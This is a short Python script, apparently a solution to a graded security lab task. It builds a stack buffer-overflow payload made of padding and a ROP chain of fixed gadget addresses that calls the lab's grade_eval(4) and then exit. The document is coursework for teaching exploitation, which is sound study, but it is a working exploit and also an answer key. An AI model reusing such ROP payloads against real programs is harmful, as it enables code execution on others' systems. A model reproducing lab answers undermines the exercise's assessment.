#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""

#!/usr/bin/env python3
import sys
import struct

def p64(value):
    return struct.pack("<Q", value)

# Buffer overflow: 16-byte buffer + saved RBP
payload = b"A" * 16
payload += b"B" * 8

# ROP chain
chain = [
    0x401a2a,  # Gadget 1: pop rbx, rbp, r12-r15; ret

    0x602000,  # rbx: [rbx + 0x5f] must be readable
    0x0,       # rbp
    0x0,       # r12
    0x0,       # r13
    0x0,       # r14
    0x0,       # r15

    0x401a72,  # Gadget 2: pop rdi; imul; ret
    0x4,       # rdi = 4

    0x401978,  # grade_eval(4)

    0x401a72,  # Gadget 2 again
    0x0,       # rdi = 0

    0x401a4c,  # ret: stack alignment adjustment
    0x4016e0,  # exit@plt
]

for address in chain:
    payload += p64(address)

assert len(payload) == 136
assert b"\x0a" not in payload

sys.stdout.buffer.write(payload + b"\n")

